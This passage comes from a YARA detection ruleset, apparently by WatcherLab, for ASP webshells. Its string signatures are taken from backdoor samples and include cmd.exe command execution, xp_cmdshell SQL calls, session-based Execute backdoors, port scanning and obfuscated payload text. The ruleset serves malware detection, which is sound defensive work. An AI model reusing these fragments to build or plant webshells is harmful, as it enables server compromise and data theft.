        $s17 = "6+cLk6RtDh tD:^Rrx^ bxrRN2ocLd ^Wo h94 :b[c:22Raxocw42RM: DmD dS0RDaYchl7 aVkRX:sR\"raR%/a lkwa pJ@#@&~,P~sbs" fullword ascii
        $s18 = "DdSr~J*@#@&,P0^CL'bxkY.`VnHhGD9SJ'Jb~KDPrUkY.`0nHhGMNBJzr#@#@&P,0slT'WsmoPK.Pbx/D.c3" fullword ascii
        $s19 = "v@*}wnU@!zl@*~r@#@&/bxkk'r@!mPtM+6xBNl-lkm.raY)w;V^sWMhcJrJLInnCO4`KlD4[r-E'dR1Ch" fullword ascii
        $s20 = "OsbVncwkVniMVbRzODDr(ED+/{&y@#@&b0~bawsr1lYbGxvD+$;n/D`rn.Wor^+E#LEZ4l.E*'F~O4+U@#@&d" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _24934ab54fe9741096d218b306347ed49e39b613_9aac9927b8b768b3a33bb3b5ead77e69523ddb93_e2c83e6bb13c8a8a8eaff34cf8fa56d2d8d98140_9
{
     meta:
        description = "asp - from files 24934ab54fe9741096d218b306347ed49e39b613.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a2c27bba48ac3d292a060b3d1e428e504281826e333729e95d0b04f2056fa1c5"
        hash2 = "2cc89b0e2ac08b26c312e2915d66a9e9f17ecbf63467e4258adbbeee5d5e84dc"
        hash3 = "51d0c9158de018e29e78a232f9551c459773328e8845310a01df5d592289e3a7"
     strings:
        $s1 = "`;``}wVZh44xf${``=wVZb44x8 c4xyxoxg:Ugplm ocF;}waVc4P${=wa Vc4B;}cEVPZjyw${=cEVPZj xoxg ;W.O.Ugplm.ocF.odZ4ZVEXH=VcwXSZV8`=wdb" fullword ascii
        $s2 = ";''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+K7P2ZE=cP2xS.7xVxf.7Vd;'2cw'=cP2xS.Txw.7Vd;)(oc4cV.7Vd;KVPocV))'?" fullword ascii
        $s3 = "`,`KZooPy`,`)'CCTE'(bLb;cP2xS.2dTE=cP2xS.yKb;'2d'=cP2xS.45:^KZooZy`(XVd&`;f4yK&;f4yK&`&)cYP,`zze|oYco`,`cYP`(XVd,``5rP" fullword ascii
        $s4 = "`,`KZooPy`,`)'CCTE'(bLb;'YN'=cP2xS.45;'`&))Y&`.o4co`(Tox8fxH.VcSVcj&`|`&)X(LwL(YC2&`'=cP2xS.yKb:^KZooZy`(XVd,`E`5rP" fullword ascii
        $s5 = ")`)ctx7a oKcoKZnKXy,VxTnVx3 Tox8KXy,gpGpijBln Ipv IGJHaG8 )D,W(IiaiRpga oKX wa(xoxgc2XQ c2yxi coxcVn`(coPEcYp.ytr" fullword ascii
        $s6 = ")`'`&Y&`'=c7xK wKx 'Y'=cfCoY cVcTb 4oEcryZ4C4.Zyw.Vc`&fSL&`o4x7 7ZVd )*(oKPZE oEc2c4`(coPEcYp.ytr=4V ocj" fullword ascii
        $s7 = "`,`KZooPy`,`)(oX7yP4.7VZd.4XTo;'dCy'=cP2xS.Txw.7VZd.4XTo;'D'=cP2xS.7xVxf.7VZd.4XTo;''=cP2xS.254.7VZd.4XTo:^`LrK" fullword ascii
        $s8 = "`Vcy7PRoVZ8\\fEo\\4wi\\wbfwV\\4wh\\VcSVcj 2xKX7V`&Pcb&`ci\\2ZVoKZn\\ocj2ZVoK`&NTK&`ZnoKcVVPn\\HpijIj\\pRasnJH_lJnml_Ipvs`=Xy5" fullword ascii
        $s9 = "`(cbw&`>';Yfk:fZo-KXtVx7'=c2Co4 X2<`&`>xcVxoYco/<`&Sf5&`>';YfWez:TowXb'=c2Co4 u=4bZV 27TE=wX 27TE=c7xK xcVxoYco<`,``5rP:`:" fullword ascii
        $s10 = ")`Vcoc7xVx8\\4Vcoc7xVx8\\VcSVcj\\W.AS\\KX`&bXX&`7wxG\\HpijIj\\pRasnJH_lJnml_Ipvs`(gJpG1pG.cdd=4X7" fullword ascii
        $s11 = "dlVnyS&`=Ccvm6i `&dlVnyS&`W=c2yxK`&EYw&`pm6i-`&dlVnyS&`W|D|D-|`&KYC&`|W.W.W.W|`&2yV&`=KXx7Zg-`&dlVnyS&`RaJHm`&PVb&`gocj-`=YS4" fullword ascii
        $s12 = "`>Kxf4/<` & )))f(4V,)Wk,)f(4V(odcl,Wk > ))f(4V(Kcl(daa(b5x & `>';Yfk:odc2-tKXwwxf;YfkAD:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,``5rP" fullword ascii
        $s13 = "_&dlVnyS&yyK&`=wVZb44x8-`&dlVnyS&ZdS&`=Vc4B-`&dlVnyS&KYC&`=ZRoVZ8-`&dlVnyS&`W.W.W.W=8a-`&dlVnyS&`8BocjGp`&7ro&`jBocj-`=XfX" fullword ascii
        $s14 = "`'` & )`''`,`'`,Yr4(cEx2fcG & `' cLX2 ` & ETo & ` cVcTh ]` & 7E4 & `[ 7ZVQ * oEc2cj`=254" fullword ascii
        $s15 = "ZZ o4ci 2Vcf`` oKXVf`&dlVnyS&`2Vcf/KXy/V4P/!#`coXVh.))`2f.o4co`(Toxffx7.VcSVc4(c2XQoYcicoxcVn.dNZ" fullword ascii
        $s16 = "KcTi)Ac7xRyw7=)c7xR.TNd(c4xEl Vm r7P=)c7xR.TNd(c4xEl Vm )`$)`&oPY&`(^`,)`.`,c7xK.TNd(2C5(c2b(oZR da" fullword ascii
        $s17 = "_&dlVnyS&`D=4T`&KLE&`ox82cG-`&dlVnyS&`W=c2yx4Xg-`&dlVnyS&`=c2XQ4cH`&x27&`KXtZl-`&dlVnyS&`\\\\`&)(VTo&`=VXgc7Zs-`" fullword ascii
        $s18 = "`c7xRVcoPf7Zn\\c7xRVcoPf7Zn\\c7xRVcoPf7Zn\\2ZVoKZn\\ocj2ZVoK`&NTK&`ZnoKcVVPn\\HpijIj\\Hl`&yor&`vs`=dZt KcTi``=dZt da" fullword ascii
        $s19 = ")O - )254(Kcl,254(odcl=254 KcTi ` Vm `=)O,254(oTtXG da" fullword ascii
        $s20 = ")k - )254(Kcl,254(odcl=254 KcTi ` wKJ `=)k,254(oTtXG da" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _4ad0615d2707c9441a46d37dd573b3a447e8b5b9_67f62eb2c0d21066ff2d5667898e7965333cec86_8a1591510f05a99b7bbe348e4cfb7ae33343d5b9__10
{
     meta:
        description = "asp - from files 4ad0615d2707c9441a46d37dd573b3a447e8b5b9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "356e77cbd3f656184b6ed64e77db692fe375b243a6bcdbec0717859852491aea"
        hash2 = "613c911f0c44d525c092672253ac10d8d3dc1d1de0f3f7d23f9fc0a05a213082"
        hash3 = "6ade2b869ed17c04679bc5d565ba9c3ba6bc40c5b1cca198df3e0887c6b45e35"
        hash4 = "8e2b5e9d0d9f6c70e55c617792caedac979f0d8c6123f90c16afd30a6f7ac9a7"
     strings:
        $x1 = "Response.Write(\"Executed #\" & I + 1 & \" Without Error<BR><BR>\")" fullword ascii
        $s2 = "Set Rs = Conn.Execute(\"Select top 1 * from \" & sTable & \"\")" fullword ascii
        $s3 = "set RS = Conn.Execute(cstr(sQuery),intRecordsAffected)" fullword ascii
        $s4 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s5 = "Conn.Execute \"alter table \" & sTable & \" drop column \" & sField" fullword ascii
        $s6 = "\"  <tr><td class=\"\"menubar\"\"><a target=\"\"mainFrame\"\" href=\"\"?action=cmdshell\"\">DOS" fullword ascii
        $s7 = "set Rs = Conn.execute(\"Select top 1 * from \" & sTable & \"\") " fullword ascii
        $s8 = "Set Rs = Conn.Execute(sSQL)" fullword ascii
        $s9 = "Set RS = Conn.Execute(sSQL)" fullword ascii
        $s10 = "c:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea><br>\"" fullword ascii
        $s11 = "\" <TD ALIGN=\"\"Left\"\" bgcolor=\"\"#FFFFFF\"\"><input type=\"\"checkbox\"\" name=\"\"MultiExec\"\" value=\"\"yes\"\">\" & _" fullword ascii
        $s12 = "Response.Write(\"Executing #\" & I + 1 & \": \" & sSQL(i) & \"<BR>\") " fullword ascii
        $s13 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s14 = "\"<form name=\"\"loginform\"\" action=\"\"?action=login\"\" method=\"\"post\"\">\" & _" fullword ascii
        $s15 = "set rs = Conn.execute(\"EXEC sp_helpfile\")" fullword ascii
        $s16 = "Conn.Execute \"DROP PROCEDURE \" & sSP" fullword ascii
        $s17 = "Conn.Execute \"DROP VIEW \" & sView" fullword ascii
        $s18 = "Conn.Execute \"Drop Table \" & sTable" fullword ascii
        $s19 = "\"<option value=\"\"exec sp_helplogins\"\">sp_helplogins</option>\" & _" fullword ascii
        $s20 = "\"<form name=\"\"spform\"\" action=\"\"?action=xpcmdshell\"\" method=\"\"post\"\">\" & _" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _9c70ae294c771e4751da383cc8b8af736fc89447_dfdb753e0df6683c03e3be07098e4042c5dec02e_11
{
     meta:
        description = "asp - from files 9c70ae294c771e4751da383cc8b8af736fc89447.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3e2d04ccb6e5251902b4202c925e96eac23df35d0adeb5338af7a75b90efaaea"
        hash2 = "ef3241f0ed93797881487fbc4e4da359687f896ef526980a1425fcd51d8519cc"
     strings:
        $s1 = ":46 - eulaVtni = eulaVtni:nehT 46 => eulaVtni fI:fI dnE:821 - eulaVtni = eulaVtni:nehT 821 => eulaVtni fI:1=KOtidE:KOtidE miD" fullword ascii
        $s2 = "= 2b ;)61 / ]2[bgr(roolf.htaM = 1b ;61*1g - ]1[bgr = 2g ;)61 / ]1[bgr(roolf.htaM = 1g ;61*1r - ]0[bgr = 2r ;)61 / ]0[bgr(roolf." fullword ascii
        $s3 = "nruter ;]2b[srolocxeh + ]1b[srolocxeh = b ;]2g[srolocxeh + ]1g[srolocxeh = g ;]2r[srolocxeh + ]1r[srolocxeh = r ;61*1b - ]2[bgr" fullword ascii
        $s4 = "tpircsavaj" fullword ascii /* reversed goodware string 'javascript' */
        $s5 = ";)61 ,))2,2(rtsbus.telpirt + )2,2(rtsbus.telpirt((tnIesrap = ]2[rrAbgr ;)61 ,))1,1(rtsbus.telpirt + )1,1(rtsbus.telpirt((tnIesr" fullword ascii
        $s6 = "i noitcnuf ;0=c rav ;0 = lavretni rav ;)(yarrA wen = pmt rav ;)(yarrA wen = sknil rav ;)(yarrA wen = stcejbo rav ;)" fullword ascii
        $s7 = "=egaugnal tpircs<" fullword ascii /* reversed goodware string '<script language=' */
        $s8 = "(redloFwohS:tpircsavaj'=ferh a<>d=di 'xp4:mottob-gniddap;dddddd# dilos xp1:redrob'=elyts " fullword ascii
        $s9 = "==yalpsid.elyts.)s(dIyBtnemelEteg.tnemucod( fi{)s(wohs_MM noitcnuf>tpircsavaj=egaugnal tpircs<" fullword ascii
        $s10 = "SItEuRl=\"http://www.zjjv.com\"" fullword ascii
        $s11 = "eman_tpircs" fullword ascii /* reversed goodware string 'script_name' */
        $s12 = "EMAN_TPIRCS" fullword ascii /* reversed goodware string 'SCRIPT_NAME' */
        $s13 = "Rrts:FOE.tlusERcer TON elihW oD:nEht FOE.tlusERcer TON fI:)yreuQrts(etucexE.nnoCoda = tlusERcer tes:" fullword ascii
        $s14 = "=elyts 2cunem=di 0=redrob elbat<>retnec=ngila dt<>rt<>rt/<>dt/<>4=thgieh dt<>rt<>rt/<dt/<>'  laicepS '=eulav  nottub=epyt " fullword ascii
        $s15 = "} ;enolCtcejbo nruter} ;]ytreporp[siht = ]ytreporp[enolCtcejbo{ esle ;)peed(enolc.]ytreporp[siht = ]ytreporp[enolCtcejbo )'tcej" fullword ascii
        $s16 = "\":For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=\" " fullword ascii
        $s17 = "== )(esaCrewoLot.txeTrotceles.]n[elurym( fi )++n ;htgnel.elurym < n ;0 = n( rof ;selur.teehsym || seluRssc.teehsym =  elurym ra" fullword ascii
        $s18 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'nimda'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s19 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'nimda'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s20 = "revoesuom" fullword ascii /* reversed goodware string 'mouseover' */
     condition:
        ( uint16(0) == 0x6f3c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _0d6e79458473ca80ccffede5496edebc0b60a7ad_dd038dd129a420f4659cea9c77e30f3d0a6925b5_12
{
     meta:
        description = "asp - from files 0d6e79458473ca80ccffede5496edebc0b60a7ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
        hash2 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
     strings:
        $s1 = "erongI.xEger~ ttap=nrettaP.xEger~ pxEgeR weN=xEger teS\":ExeCuTe(UZSS(ShiSan)):End Function " fullword ascii
        $s2 = "Call ws.Run (ShellPath&\" /c \" & DefCmd & \" > \" & szTempFile, 0, True)" fullword ascii
        $s3 = "\"-HomeDir=c:\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
        $s4 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
        $s5 = "</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>\"&Request.ServerVariables(\"NUMBER_OF_PROCESSORS\")&\"</td></tr>\"" fullword ascii
        $s6 = "Server.CreateObject(\"Scripting.FileSystemObject\").CreateFolder(Left(thePath, i - 1))" fullword ascii
        $s7 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
        $s8 = "tURLEncode = temp:End Function:Sub ShowAllFile2(Path):Set F4SO = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s9 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Mid(path,sz)" fullword ascii
        $s10 = "GetDateCreate = s:End Function:Function tURLEncode(Str):temp = Replace(Str, \"%\", \"%25\")" fullword ascii
        $s11 = "SI=SI&\"<form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20'" ascii
        $s12 = "GetDateModify = s:End Function:Function GetDateCreate(filepath):Set F3SO = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s13 = "222222222222222222222222222222222222222222222222222222" ascii /* hex encoded string '"""""""""""""""""""""""""""' */
        $s14 = ";Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:If Err Then" ascii
        $s15 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
        $s16 = "execute(LUnEnCode(\"stnyhszK%isJ?wyXw\\jW%B%w\\jWhX%%%" fullword ascii
        $s17 = "Function EditFile(Path):execute(shisanfun(\"IS SRR" fullword ascii
        $s18 = "RRS\"input,select,textarea{font-size: 12px;color:\"&wz&\";background-color:\"&budu&\";border:1px solid \"&wz&\"}\"" fullword ascii
        $s19 = "End If:End Sub:Sub step_all(agr):retVal=IsPattern(\"(\\\\|\\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|lo" ascii
        $s20 = "esjmY%.'knh3'+jrfswj{wjx+'ahjysfr~XafyfI%stnyfhnquuFaxwjxZ%qqFaxlsnyyjX%isF%xysjrzhtIa'+wj{nwix~x-xyxn}JjqnK3txk%kN%%%%%%" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _8735bc9aadc3c214cdffc8d49b953a3b681ee548_c2d23126780f20a65082fbb4e5fcc092184a82a9_e6ad72172f90b22085f19c88d09dfe148926d75b_13
{
     meta:
        description = "asp - from files 8735bc9aadc3c214cdffc8d49b953a3b681ee548.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4f0bed5df982d6c5cca81048eaf1299ef5c6905ea8f0268e02b80c64e8f6edb6"
        hash2 = "ee03d95eedaec69608600dc07b35db774c0182e9e60787c4cda9626e4dc0d513"
        hash3 = "80250e9c13eba2ed0341112f9321a10c31278c21c2d82a9d1229b919face0972"
     strings:
        $x1 = "Set ijre=zsckm.ExecQuery(\"select * from Win32_Pro\"&ivj&\"cess where ProcessId='\"&pid&\"'\")" fullword ascii
        $x2 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
        $x3 = "Set rrf=zsckm.ExecQuery(\"select * from Win32_NetworkAda\"&dkp&\"pterConfiguration where IPEnabled ='True'\")" fullword ascii
        $x4 = "Set qxau=zsckm.ExecQuery(\"select * from Win3\"&dwt&\"2_Service where Name='\"&dlzu&\"'\")" fullword ascii
        $x5 = "bdyaf=bdyaf&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
        $x6 = "bdyaf=bdyaf&\"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | \"" fullword ascii
        $s7 = "zepw\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
        $s8 = "On Error Resume Next:Execute nedsl&\".\"&strPam&\".value=rsdx(\"&nedsl&\".\"&strPam&\".value)\"" fullword ascii
        $s9 = "zhv\"com\"&sruz&\"mand execute succeed!Refresh the iframe below to check result.\"" fullword ascii
        $s10 = "Set mgl=blhvq.Execute(str)" fullword ascii
        $s11 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
        $s12 = "zepw\"C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\",\"PcAnywhere\"" fullword ascii
        $s13 = "zepw\"C:\\Documents and Settings\\All Users\\Documents\",\"Documents\"" fullword ascii
        $s14 = "bdyaf=bdyaf&\"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | \"" fullword ascii
        $s15 = "bdyaf=bdyaf&\"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | \"" fullword ascii
        $s16 = "zepw\"C:\\Documents and Settings\\All Users\",\"All Users\"" fullword ascii
        $s17 = "doTd\"<a href=\"\"javascript:adwba('\"&goaction&\"','stopone','\"&cpmvi.ProcessId&\"')\"\">Terminate</a>\",\"\"" fullword ascii
        $s18 = "zepw\"C:\\Program Files\\RhinoSoft.com\",\"RhinoSoft.com\"" fullword ascii
        $s19 = "Set bnes=dtwz(\"wi\"&kcb&\"nmgmts:\\\\.\\ro\"&todxo&\"ot\\default:StdRegP\"&bqlnw&\"rov\")" fullword ascii
        $s20 = "echo\"<div align=right>Processed in :\"&apwc&\"seconds</div></td></tr></table></body></html>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _42ca332dbe4463b083d24bd019115a00db413c2b_86a23719e51edc09f7d68388226dd3319ee7a916_970264364422b3d34bd008e02d794baf3df62b00__14
{
     meta:
        description = "asp - from files 42ca332dbe4463b083d24bd019115a00db413c2b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bc041032ed36879be7e068d17db8fdbe4c251596276fba1cc4f8ac8efa2bae34"
        hash2 = "640ef6949c07edc04c8ce29ffb49efc70efc75fd6304c1a9203134ba3b51d0a9"
        hash3 = "7580a31513ba4719a1eb7fd037b7d8b1ec13077605936d8e1b87965c3429010e"
        hash4 = "ce13b9dcf134bea0a6766c65f8229455bbe3fabae225018fcf252f091aefb019"
        hash5 = "46487a3f8ee782d4cc95b98f5f7ebef6d8de4f0858cf33cd700d576a4b770251"
        hash6 = "65dbdb94717f956d1529eae468447f65f95a91f16019173aa740894845abc1d3"
        hash7 = "4334d3b9d075e530187d23cd7f8f067de67c3a94e6888335d8b0d4c9ca4a9187"
        hash8 = "7f4139601930bba578adbd3f152397f7396688744df2b231b2fcaa90e36a995f"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s4 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s5 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s6 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s7 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s8 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s9 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s10 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s11 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s12 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s13 = "CONN.ExecUtE(sqlSTR)" fullword ascii
        $s14 = "\"\");FullDbStr(0);return false;}return true;}\":jb\"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"" ascii
        $s15 = "si=si&\"<iframe id=cmdResult src='?cmdtype=shellresult&Action=Cmd1Shell' style='width:100%;height:440;'>\"" fullword ascii
        $s16 = "jb\"<tr><td height='20'><a href='?Action=ReadREG' target='FileFrame'>" fullword ascii
        $s17 = "jb\"<tr><td height='20'><a href='?Action=AdminUser' target='FileFrame'>" fullword ascii
        $s18 = "ReSPoNse.AddHEaDer \"Content-Disposition\", \"attachment; filename=\" & mid(pAth,SZ)" fullword ascii
        $s19 = "\":jb \"<TD align=middle><a href=\"&URL&\"?Action=ScFolder&Folder=c:\\recycler\\>" fullword ascii
        $s20 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _21fd0ada0d0c86b6899d5b7af4b55e72884a5513_9bac59023b27a7ce066f2c4e7d3c1b1df9d5133f_c54850d94f70e18accddda418b32ed3510092348_15
{
     meta:
        description = "asp - from files 21fd0ada0d0c86b6899d5b7af4b55e72884a5513.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
        hash2 = "39e42a7d88da56b57f095012aa94590ece4ee28b01984abbe366a52434f4c38c"
        hash3 = "fbfdd9aca6c7ddb7c2ed97f1852f1b9896a6149874c5b4163186fb71a32ded2f"
     strings:
        $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":o SI:SI=\"\":If tri" ascii
        $x2 = "strBAD=strBAD&\"If Session(\"\"\"&clientPassword&\"\"\")<>\"\"\"\" Then Execute Session(\"\"\"&clientPassword&\"\"\")\"" fullword ascii
        $x3 = "\"\";var speed = 10000;var x = 0;var color = new initArray(\"\"#ffff00\"\", \"\"#ff0000\"\", \"\"#ff00ff\"\",\"\"#0000ff\"\",\"" ascii
        $x4 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\"&targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
        $x5 = "='#003000'\"\"><a href='?Action=Cmd1Shell' target='FileFrame'><font face='wingdings'>8</font> CMD---" fullword ascii
        $x6 = "if ShellPath=\"\" Then ShellPath=\"cmd.exe\"" fullword ascii
        $s7 = "='\"&DefCmd&\"'> <input type='submit' value='Execute'></td></tr><tr><td id=d><textarea Style='width:100%;height:440;'>\"" fullword ascii
        $s8 = "http.SetRequestHeader \"REFERER\", \"\"&net&\"\"&request.ServerVariables(\"HTTP_HOST\")&request.ServerVariables(\"URL\")" fullword ascii
        $s9 = "or='#003000'\"\"><a href='?Action=Logout' target='FileFrame'><center><font face='wingdings'>8</font> " fullword ascii
        $s10 = "!)</font></a></center><tr><td height='20'><a href='?Action=UpLoad' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s11 = "ackgroundColor='#003000'\"\"><a href='?Action=ScanDriveForm' target='FileFrame'><font face='wingdings'>8</font> " fullword ascii
        $s12 = "request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:str" ascii
        $s13 = "\"-Maintenance=System\"&vbCrLf&\"-PasswordType=Regular\"&vbCrLf&\"-Ratios=None\"&vbCrLf&\" Access=c:\\\\|RWAMELCDP\"&vbCrLf" fullword ascii
        $s14 = "><a href='?Action=Mssql' target='FileFrame'><font face='wingdings'>8</font> Sqlrootkit</a></td></tr>\"" fullword ascii
        $s15 = "='?Action=hiddenshell' target='FileFrame'><font face='webdings'>8</font> " fullword ascii
        $s16 = ".Connection\"):adoConn.Open \"Provider=SQLOLEDB.1;Password=\"&password&\";User ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeLl" ascii
        $s17 = "Call ws.Run (ShellPath&\" /c \"&DefCmd&\" > \"&szTempFile, 0, True)" fullword ascii
        $s18 = "='#003000'\"\"><a href='?Action=UpLoad' target='FileFrame'><font face='wingdings'>8</font> " fullword ascii
        $s19 = "><a href='?Action=Sqlrootkit' target='FileFrame'><font face='wingdings'>8</font> MS_sql" fullword ascii
        $s20 = "\"\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str=new Array(12);Str[0]=\"\"Provider=" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _78b5889b363043ed8a60bed939744b4b19503552_af40f4c36e3723236c59dc02f28a3efb047d67dd_16
{
     meta:
        description = "asp - from files 78b5889b363043ed8a60bed939744b4b19503552.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1f2199d3b299f97feec2616cbd173a4f2b0ef832bd2b8dc7981e2fad65c82d27"
        hash2 = "9b799e4eb013c79c3f0cfceb935f6b0953510cfcc03e6fd6c285d52a5ff1dd9d"
     strings:
        $s1 = "YK2RmNNMWGDsRwWsNn.hlOtc-l^En~{PsGs9+.iDGaRC9NM0WM:cdE(:rYv#IN6Ex1OkKxPw;sVwWM:csHCs+Ssz^YbWUbPYW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s2 = "jOD@#@&1WUx 3X+^EDn`rZ.nmY+~Pm4s+,obVnGlDl`&N,rxDP(fA1P(:5`ZSF*Pn\"(\\b\"5,|35~/djjKA]2G~~O4+nCO4P#lM/4l.BP6kV" fullword ascii
        $s3 = "/ORUnM\\nM.mDkm4^n/vJ4YDwm4K/Yrb@#@&s1mhn'\"+$En/OcrsHlsnJ*@#@&^96'E@!DD@*@!D[,k[{N,hk9Y4x,lPGxtW;d" fullword ascii
        $s4 = "\\+ksk^nxJ,[,\\8m.s6P'PrRfb/C8^+'TE,[~\\(^MVW,[,JO\"+^KlDtd'8J~',\\41.V6P[,m@#@&rOg+nNjn1E.+{TJ,[~-(mDsW,[~J ubNn_k9N+" fullword ascii
        $s5 = ",EJrPGx\\G!/nr!O'rJO4b/RdOHVnR(C13LMW!xN;W^GD{B:FyF+qyBJr@*@!mPtMnW'ELm\\C/^.bwO)U4WSsGs9+DcErJ'I" fullword ascii
        $s6 = "@*|#F|={O6k;^~#=;^^1=|'D[$0~#=6YDMWb|={Y4x.P\"a40W@!@*ybEW0xWEK/$Pv441O)\"k!GYbOOWK/BxOkx\"V,4Tyx6EK/;1PM\"@!@*3\"@!#[/i{Zj" fullword ascii
